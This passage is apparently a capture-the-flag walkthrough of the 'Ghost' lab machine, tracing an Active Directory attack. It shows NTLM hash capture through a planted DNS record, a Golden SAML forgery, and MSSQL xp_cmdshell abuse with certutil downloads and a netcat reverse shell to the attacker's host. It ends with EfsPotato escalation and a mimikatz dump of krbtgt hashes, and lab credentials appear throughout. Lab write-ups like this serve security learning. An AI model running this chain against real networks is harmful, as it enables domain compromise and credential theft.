SMB         10.129.231.105  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.231.105  445    DC01             NETLOGON        READ                   Logon server share 
SMB         10.129.231.105  445    DC01             SYSVOL          READ                   Logon server share 
SMB         10.129.231.105  445    DC01             Users           READ
```


THERE WE GO!!, lets get bloodhound data and check the `Users` share


```bash
…/labs/ghost 10.10.17.85 5s 🐍 ❯ smbclient.py -k -no-pass ghost.htb/florence.ramirez@DC01.ghost.htb
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
IPC$                      IPC (SPECIAL)   Remote IPC
NETLOGON                  DISK            Logon server share 
SYSVOL                    DISK            Logon server share 
Users                     DISK            
# use Users
# ls
drw-rw-rw-          0  Sun Feb  4 22:48:26 2024 .
drw-rw-rw-          0  Wed Jul 31 17:38:56 2024 ..
drw-rw-rw-          0  Sat Feb  3 05:46:15 2024 Administrator
drw-rw-rw-          0  Wed Jan 31 10:24:31 2024 Default
-rw-rw-rw-        174  Wed Jan 31 10:22:39 2024 desktop.ini
```


too bad, looks like there isn’t much to it


```bash
…/labs/ghost 10.10.17.85 2s 🐍 ❯ bloodyAD -d ghost.htb -k --host DC01.ghost.htb --dc-ip 10.129.231.105 get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=ghost,DC=htb
permission: WRITE

distinguishedName: CN=Florence Ramirez,CN=Users,DC=ghost,DC=htb
permission: WRITE

distinguishedName: DC=ghost.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ghost,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.ghost.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=ghost,DC=htb
permission: CREATE_CHILD
```


nothing writable specifically interesting


a couple of things we found on bloodhound


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/57f7c366-5bb2-41de-bf82-6e3f126f4554/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667L3FSK4P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICzT5MvlpqzMPj%2BNu6lH0uv9SU8q2qnwLeZfIt%2FKw2nBAiEA%2BUR54BEDve%2B1yd7%2B7CHF4QiBQpPRrs%2BvfrsFqoLtVC8q%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDP7kfzj2QNnQYXmZgSrcA5xB0zZhAi2fAEGXIM49NwkOyQmi%2F8tz5%2FfLgLOKkNybcA88%2BtqsBkJfUsMXTzjBjiavvnvw9nCziOFh3d5ETX2CfC%2FC4BMSswsUpX6ab1s95rnDpjwOJxBG73AGqRb3p17E%2BckOMCeb6D%2FzJZALQb0yd4FQFN46q6n0%2FMcqQqMIANRcnxxbu3g85w7Cs2tdnwdiCLyEbQ0VG1BQ1HNilrulFubEcSyI5wPo3O1dOEK3wSTnl1LOiZbHoU%2F3YXWXPCOWuibdqnwaBgmv9PAzewQYwvJhVbspuzsiGHmVzmSren6reflwSxRGogbbIRCghVvYAQVMX9VQQx7nBMOlIWajPLvIDsRKbmhGr8OoAGsjYsmalOBGlC4%2Btc%2BHHBmEkk9WPzhO%2BUAhf6HsPaEJ4Lbk5zftPhpV0wUdzIJHG3hWwleI94ty35qegVc0anzWJKZOqP39%2FXAROrqkdpLFWU0tFquFPtoh0YatBbrPabqd4ujUutghNjgdec%2FhLeykrLA%2Br3gJ1v%2Bxq%2FowB2npSZ%2BhqnPBc74qmsKl%2FxaP45ZDi8n32YbJ7aK1ku5%2BDBqOTumigosxKdsCo35x2GRuBT0oeVDLnCIBxx8nlfV2Lxvr2c0Gw%2B7D85U%2F4%2FXjMN%2BVttIGOqUBNuZ05tN0RfzbLXzEX%2F5R4IRCl%2Bnlwi75ALhVo1uO8MB9fWEwSLvwhvz%2BEh1T81FcKV5eUvRdoV7IMY5H%2BntGksnNXYiI%2BKAXjbdgCxm100%2Fxl2xILIUwDnd7THBF6sPvfXpmySObONzDKhMS%2BS20LhWK7OW99LaSp8DwlfW4U2WCJqMt2LapQRPpJRg2wiN362klz4HZO6CcSUyieUEznCuqLd1t&X-Amz-Signature=a3b271eac05186265506ba4983c7374ac32744c3edcbebdf5e2046b5ca1d0618&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


ADFS is obviously the privesc part, but `justin.bradley` is in remote management users, so that is surely where the user flag is, and one more thing to note 


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/6f29d001-dbbf-4fd8-8a4c-6041f0da6e2c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667L3FSK4P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICzT5MvlpqzMPj%2BNu6lH0uv9SU8q2qnwLeZfIt%2FKw2nBAiEA%2BUR54BEDve%2B1yd7%2B7CHF4QiBQpPRrs%2BvfrsFqoLtVC8q%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDP7kfzj2QNnQYXmZgSrcA5xB0zZhAi2fAEGXIM49NwkOyQmi%2F8tz5%2FfLgLOKkNybcA88%2BtqsBkJfUsMXTzjBjiavvnvw9nCziOFh3d5ETX2CfC%2FC4BMSswsUpX6ab1s95rnDpjwOJxBG73AGqRb3p17E%2BckOMCeb6D%2FzJZALQb0yd4FQFN46q6n0%2FMcqQqMIANRcnxxbu3g85w7Cs2tdnwdiCLyEbQ0VG1BQ1HNilrulFubEcSyI5wPo3O1dOEK3wSTnl1LOiZbHoU%2F3YXWXPCOWuibdqnwaBgmv9PAzewQYwvJhVbspuzsiGHmVzmSren6reflwSxRGogbbIRCghVvYAQVMX9VQQx7nBMOlIWajPLvIDsRKbmhGr8OoAGsjYsmalOBGlC4%2Btc%2BHHBmEkk9WPzhO%2BUAhf6HsPaEJ4Lbk5zftPhpV0wUdzIJHG3hWwleI94ty35qegVc0anzWJKZOqP39%2FXAROrqkdpLFWU0tFquFPtoh0YatBbrPabqd4ujUutghNjgdec%2FhLeykrLA%2Br3gJ1v%2Bxq%2FowB2npSZ%2BhqnPBc74qmsKl%2FxaP45ZDi8n32YbJ7aK1ku5%2BDBqOTumigosxKdsCo35x2GRuBT0oeVDLnCIBxx8nlfV2Lxvr2c0Gw%2B7D85U%2F4%2FXjMN%2BVttIGOqUBNuZ05tN0RfzbLXzEX%2F5R4IRCl%2Bnlwi75ALhVo1uO8MB9fWEwSLvwhvz%2BEh1T81FcKV5eUvRdoV7IMY5H%2BntGksnNXYiI%2BKAXjbdgCxm100%2Fxl2xILIUwDnd7THBF6sPvfXpmySObONzDKhMS%2BS20LhWK7OW99LaSp8DwlfW4U2WCJqMt2LapQRPpJRg2wiN362klz4HZO6CcSUyieUEznCuqLd1t&X-Amz-Signature=182bce21147922ef16f4699cd2362dc40cf30914ab5b5ebf2af49e07796d9c94&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


bradley was noted earlier in the intranet to be sending requests to a non existent domain


```bash
…/labs/ghost 10.10.17.85 🐍 ❯ bloodyAD -d ghost.htb -k --host DC01.ghost.htb --dc-ip 10.129.231.105 add dnsRecord bitbucket 10.10.17.85
[+] bitbucket has been successfully added
```


by default in active directory, domain users can add new subdomains, so we create a subdomain `bitbucket.ghost.htb` that points to our machine


another thing is, whenever AD services interact with something, they do NTLMv2 Authentication, so we’ll be able to get bradley’s hash


```bash
[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.129.231.105
[HTTP] GET request from: ::ffff:10.129.231.105  URL: / 
[HTTP] NTLMv2 Client   : 10.129.231.105
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:2557da27577a4a81:BA23B0F3C8F3DC42E976F84794CC7CEA:0101000000000000C7B84B5492FFDC019F585F8DAF571AD90000000002000800380044004400470001001E00570049004E002D00350051004F004C00550055005A004C005800590034000400140038004400440047002E004C004F00430041004C0003003400570049004E002D00350051004F004C00550055005A004C005800590034002E0038004400440047002E004C004F00430041004C000500140038004400440047002E004C004F00430041004C000800300030000000000000000000000000400000319AE70282C0E51DF150D03A3FBFB15E72D8E6ED98841AB73A5F419816FD48490A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000
```


and we got bradley’s password

> Username `justin.bradley` & Password `Qwertyuiop1234$$` 

## Privilege Escalation


along with the `ReadGMSAPassword` on `ADFS` service account we found on bloodhound, there was one more thing that caught my eye


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/0b49d336-22bf-4332-af56-a19f2b6721fa/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667L3FSK4P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICzT5MvlpqzMPj%2BNu6lH0uv9SU8q2qnwLeZfIt%2FKw2nBAiEA%2BUR54BEDve%2B1yd7%2B7CHF4QiBQpPRrs%2BvfrsFqoLtVC8q%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDP7kfzj2QNnQYXmZgSrcA5xB0zZhAi2fAEGXIM49NwkOyQmi%2F8tz5%2FfLgLOKkNybcA88%2BtqsBkJfUsMXTzjBjiavvnvw9nCziOFh3d5ETX2CfC%2FC4BMSswsUpX6ab1s95rnDpjwOJxBG73AGqRb3p17E%2BckOMCeb6D%2FzJZALQb0yd4FQFN46q6n0%2FMcqQqMIANRcnxxbu3g85w7Cs2tdnwdiCLyEbQ0VG1BQ1HNilrulFubEcSyI5wPo3O1dOEK3wSTnl1LOiZbHoU%2F3YXWXPCOWuibdqnwaBgmv9PAzewQYwvJhVbspuzsiGHmVzmSren6reflwSxRGogbbIRCghVvYAQVMX9VQQx7nBMOlIWajPLvIDsRKbmhGr8OoAGsjYsmalOBGlC4%2Btc%2BHHBmEkk9WPzhO%2BUAhf6HsPaEJ4Lbk5zftPhpV0wUdzIJHG3hWwleI94ty35qegVc0anzWJKZOqP39%2FXAROrqkdpLFWU0tFquFPtoh0YatBbrPabqd4ujUutghNjgdec%2FhLeykrLA%2Br3gJ1v%2Bxq%2FowB2npSZ%2BhqnPBc74qmsKl%2FxaP45ZDi8n32YbJ7aK1ku5%2BDBqOTumigosxKdsCo35x2GRuBT0oeVDLnCIBxx8nlfV2Lxvr2c0Gw%2B7D85U%2F4%2FXjMN%2BVttIGOqUBNuZ05tN0RfzbLXzEX%2F5R4IRCl%2Bnlwi75ALhVo1uO8MB9fWEwSLvwhvz%2BEh1T81FcKV5eUvRdoV7IMY5H%2BntGksnNXYiI%2BKAXjbdgCxm100%2Fxl2xILIUwDnd7THBF6sPvfXpmySObONzDKhMS%2BS20LhWK7OW99LaSp8DwlfW4U2WCJqMt2LapQRPpJRg2wiN362klz4HZO6CcSUyieUEznCuqLd1t&X-Amz-Signature=fe620fd3274d4579d1b1c135ec6d5903661e15ad6acf3b308dde841a45fba970&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


we have 2 domains, with a bidirectional trust, that will surely come into play later


lets start by getting the gMSA for now


```bash
…/labs/ghost 10.10.17.85 🐍 ✗ bloodyAD -d ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$'  --host DC01.ghost.htb --dc-ip 10.129.231.105 get object 'ADFS_GMSA$' --attr msds-ManagedPassword

distinguishedName: CN=adfs_gmsa,CN=Managed Service Accounts,DC=ghost,DC=htb
msDS-ManagedPassword.NT: 16b9766667b1e9f8d4c315a11707c497
```

> Username `ADFS_GMSA$` & NT-Hash `16b9766667b1e9f8d4c315a11707c497`

a service account running AD FS (such as a gMSA), helps us gain the ability to access and decrypt AD FS token-signing certificates.


[https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-saml-attack/](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-saml-attack/)


as linux tools that do this process don’t exist, its obvious we’ll be using Mandiant tools, thats why we were given the winrm access to begin with


[https://github.com/mandiant/ADFSDump/tree/master](https://github.com/mandiant/ADFSDump/tree/master)


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/aca83f17-1c6d-414e-92c8-3e352efa34a4/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667L3FSK4P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICzT5MvlpqzMPj%2BNu6lH0uv9SU8q2qnwLeZfIt%2FKw2nBAiEA%2BUR54BEDve%2B1yd7%2B7CHF4QiBQpPRrs%2BvfrsFqoLtVC8q%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDP7kfzj2QNnQYXmZgSrcA5xB0zZhAi2fAEGXIM49NwkOyQmi%2F8tz5%2FfLgLOKkNybcA88%2BtqsBkJfUsMXTzjBjiavvnvw9nCziOFh3d5ETX2CfC%2FC4BMSswsUpX6ab1s95rnDpjwOJxBG73AGqRb3p17E%2BckOMCeb6D%2FzJZALQb0yd4FQFN46q6n0%2FMcqQqMIANRcnxxbu3g85w7Cs2tdnwdiCLyEbQ0VG1BQ1HNilrulFubEcSyI5wPo3O1dOEK3wSTnl1LOiZbHoU%2F3YXWXPCOWuibdqnwaBgmv9PAzewQYwvJhVbspuzsiGHmVzmSren6reflwSxRGogbbIRCghVvYAQVMX9VQQx7nBMOlIWajPLvIDsRKbmhGr8OoAGsjYsmalOBGlC4%2Btc%2BHHBmEkk9WPzhO%2BUAhf6HsPaEJ4Lbk5zftPhpV0wUdzIJHG3hWwleI94ty35qegVc0anzWJKZOqP39%2FXAROrqkdpLFWU0tFquFPtoh0YatBbrPabqd4ujUutghNjgdec%2FhLeykrLA%2Br3gJ1v%2Bxq%2FowB2npSZ%2BhqnPBc74qmsKl%2FxaP45ZDi8n32YbJ7aK1ku5%2BDBqOTumigosxKdsCo35x2GRuBT0oeVDLnCIBxx8nlfV2Lxvr2c0Gw%2B7D85U%2F4%2FXjMN%2BVttIGOqUBNuZ05tN0RfzbLXzEX%2F5R4IRCl%2Bnlwi75ALhVo1uO8MB9fWEwSLvwhvz%2BEh1T81FcKV5eUvRdoV7IMY5H%2BntGksnNXYiI%2BKAXjbdgCxm100%2Fxl2xILIUwDnd7THBF6sPvfXpmySObONzDKhMS%2BS20LhWK7OW99LaSp8DwlfW4U2WCJqMt2LapQRPpJRg2wiN362klz4HZO6CcSUyieUEznCuqLd1t&X-Amz-Signature=cca4571292a0df95f9c4e04d59254b3c6aeb5ef840923cf2b184059912f9e5d5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


and there we go, we have all we need for a Golden SAML Attack


now we can make our own SAML Token that impersonates corp admin


```bash
ADFSpoof master ? 10.10.17.85 🐍 ❯ python3 ADFSpoof.py -b ../token.bin ../key1.bin \
  -s core.ghost.htb \
  saml2 \
  --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse \
  --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient \
  --nameid 'GHOST\administrator' \
  --rpidentifier https://core.ghost.htb:8443 \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>GHOST\administrator</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfN1E2VTRFIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNi0wNi0xOVQwNDowNzo0MS4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29...
```


### Normal ADFS SP-Initiated Flow

1. User visits `core.ghost.htb` → Core generates a `SAMLRequest` and redirects to `federation.ghost.htb`
2. User authenticates with domain credentials at ADFS
3. ADFS validates credentials against AD, builds a signed `SAMLResponse` assertion
4. ADFS POSTs the `SAMLResponse` to Core's ACS URL (`/adfs/saml/postResponse`)
5. Core validates the signature using ADFS's public token-signing cert → grants access

we basically crafted our own `SAMLResponse` imperosonating `Administrator` given we had ADFS’s private keys, then intercepted a login request as `justin.bradley` and put our own ticket


and VOILA, ACCESS TO THE PANEL!!


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/4bbe7f62-3140-43fe-a532-c767686cb3dc/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667L3FSK4P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICzT5MvlpqzMPj%2BNu6lH0uv9SU8q2qnwLeZfIt%2FKw2nBAiEA%2BUR54BEDve%2B1yd7%2B7CHF4QiBQpPRrs%2BvfrsFqoLtVC8q%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDP7kfzj2QNnQYXmZgSrcA5xB0zZhAi2fAEGXIM49NwkOyQmi%2F8tz5%2FfLgLOKkNybcA88%2BtqsBkJfUsMXTzjBjiavvnvw9nCziOFh3d5ETX2CfC%2FC4BMSswsUpX6ab1s95rnDpjwOJxBG73AGqRb3p17E%2BckOMCeb6D%2FzJZALQb0yd4FQFN46q6n0%2FMcqQqMIANRcnxxbu3g85w7Cs2tdnwdiCLyEbQ0VG1BQ1HNilrulFubEcSyI5wPo3O1dOEK3wSTnl1LOiZbHoU%2F3YXWXPCOWuibdqnwaBgmv9PAzewQYwvJhVbspuzsiGHmVzmSren6reflwSxRGogbbIRCghVvYAQVMX9VQQx7nBMOlIWajPLvIDsRKbmhGr8OoAGsjYsmalOBGlC4%2Btc%2BHHBmEkk9WPzhO%2BUAhf6HsPaEJ4Lbk5zftPhpV0wUdzIJHG3hWwleI94ty35qegVc0anzWJKZOqP39%2FXAROrqkdpLFWU0tFquFPtoh0YatBbrPabqd4ujUutghNjgdec%2FhLeykrLA%2Br3gJ1v%2Bxq%2FowB2npSZ%2BhqnPBc74qmsKl%2FxaP45ZDi8n32YbJ7aK1ku5%2BDBqOTumigosxKdsCo35x2GRuBT0oeVDLnCIBxx8nlfV2Lxvr2c0Gw%2B7D85U%2F4%2FXjMN%2BVttIGOqUBNuZ05tN0RfzbLXzEX%2F5R4IRCl%2Bnlwi75ALhVo1uO8MB9fWEwSLvwhvz%2BEh1T81FcKV5eUvRdoV7IMY5H%2BntGksnNXYiI%2BKAXjbdgCxm100%2Fxl2xILIUwDnd7THBF6sPvfXpmySObONzDKhMS%2BS20LhWK7OW99LaSp8DwlfW4U2WCJqMt2LapQRPpJRg2wiN362klz4HZO6CcSUyieUEznCuqLd1t&X-Amz-Signature=baadd7ab0d6c043568a21d6ca9779c804d9ff2c308019fcfb2fe0aad4f8a747d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


we can see that we have linked databases in action

- On `ghost.htb` you're `web_client` : no sysadmin
- On `corp.ghost.htb` you're `bridge_corp` : no sysadmin

```bash
[SMB] NTLMv2-SSP Client   : 10.129.231.105
[SMB] NTLMv2-SSP Username : GHOST-CORP\PRIMARY$
[SMB] NTLMv2-SSP Hash     : PRIMARY$::GHOST-CORP:6e280709ddf55453:3779A15A0B43634254FF80ABAC6C6CCB:010100000000000000708264ACFFDC01BE394013B1D7E9B700000000020008004A0052005600520001001E00570049004E002D0033004200570042004E004C003700560032005300430004003400570049004E002D0033004200570042004E004C00370056003200530043002E004A005200560052002E004C004F00430041004C00030014004A005200560052002E004C004F00430041004C00050014004A005200560052002E004C004F00430041004C000700080000708264ACFFDC0106000400020000000800300030000000000000000000000000300000FF44D6438A1743A09DCAD1385339DE00D85367AF4CC1B265D8848424A385DC860A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00380035000000000000000000
[SMB] NTLMv2-SSP Client   : 10.129.231.105
[SMB] NTLMv2-SSP Username : GHOST\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::GHOST:cd7745f24d4dca01:F68FCF3E04C778CDE2E239A1658A1A23:010100000000000000708264ACFFDC017556620829CC388500000000020008004A0052005600520001001E00570049004E002D0033004200570042004E004C003700560032005300430004003400570049004E002D0033004200570042004E004C00370056003200530043002E004A005200560052002E004C004F00430041004C00030014004A005200560052002E004C004F00430041004C00050014004A005200560052002E004C004F00430041004C000700080000708264ACFFDC0106000400020000000800300030000000000000000000000000300000319AE70282C0E51DF150D03A3FBFB15E72D8E6ED98841AB73A5F419816FD48490A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00380035000000000000000000
```


both SQL Server are running with machine accounts, so their hashes are not crackable, we need to think of sm else, lets check impersonation


```bash
select result from openquery("PRIMARY", 'select distinct b.name as result from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = ''IMPERSONATE'';')

{
    "recordsets": [
        [
            {
                "result": "sa"
            }
        ]
    ],
    "recordset": [
        {
            "result": "sa"
        }
    ],
    "output": {},
    "rowsAffected": [
        1
    ]
}
```


there we go, we can impersonate `SA` on core MSSQL Instance


```bash
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''whoami''') AT [PRIMARY]

{
    "recordsets": [
        [
            {
                "output": "nt service\\mssqlserver"
            },
            {
                "output": null
            }
        ]
    ],
    "recordset": [
        {
            "output": "nt service\\mssqlserver"
        },
        {
            "output": null
        }
    ],
    "output": {},
    "rowsAffected": [
        2
    ]
}
```


okey great, lets get ourselves a shell now


```bash
## we'll first upload the netcat binary
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''certutil -urlcache -f http://10.10.17.85:9000/nc64.exe -o C:\windows\temp\nc64.exe''') AT [PRIMARY]

## then we run it and point it at our machine
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''C:\windows\temp\nc64.exe -e powershell 10.10.17.85 9999''') AT [PRIMARY]


## start listener and wait for our shell
…/labs/ghost 10.10.17.85 3m29s 🐍 ✗ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.231.105 49823
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```


one thing quickly stands out 


```bash
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name              SID                                                            
====================== ===============================================================
nt service\mssqlserver S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES                    Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


we have `SeImpersonatePrivilege` , lets upload godpotato and get `Administrator` on `core` 


godpotato didn’t work because AV was enabled, so i had to use EfsPotato


```bash
PS C:\programdata> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs
Microsoft (R) Visual C# Compiler version 4.8.4161.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

EfsPotato.cs(123,29): warning CS0618: 'System.IO.FileStream.FileStream(System.IntPtr, System.IO.FileAccess, bool)' is obsolete: 'This constructor has been deprecated.  Please use new FileStream(SafeFileHandle handle, FileAccess access) instead, and optionally make a new SafeFileHandle with ownsHandle=false if needed.  http://go.microsoft.com/fwlink/?linkid=14202'
PS C:\programdata> .\EfsPotato.exe 'C:\windows\temp\nc64.exe 10.10.17.85 9998 -e powershell.exe'    
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=e7e630)
[+] Get Token: 912
[!] process with pid: 1060 created.
==============================
```


now that we got access as system on core, lets dump the nt hashes, including krbtgt hash, which will help us make a golden ticket, that will work on the other domain


```bash
PS C:\Windows\Temp> certutil -urlcache -f http://10.10.17.85:9000/mimikatz.exe mimikatz.exe
certutil -urlcache -f http://10.10.17.85:9000/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp> .\mimikatz.exe "lsadump::lsa /patch" "exit"
mimikatz(commandline) # lsadump::dcsync
/user:krbtgt@corp.ghost.htb
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] 'krbtgt@corp.ghost.htb' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 1/31/2024 7:34:01 PM
Object Security ID   : S-1-5-21-2034262909-2733679486-179904498-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 69eb46aa347a8c68edb99be2725403ab
    ntlm- 0: 69eb46aa347a8c68edb99be2725403ab
    lm  - 0: fceff261045c75c4d7f6895de975f6cb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4acd753922f1e79069fd95d67874be4c

* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.GHOST.HTBkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d
      aes128_hmac       (4096) : ea18711cfd69feef0c8efba75bca9235
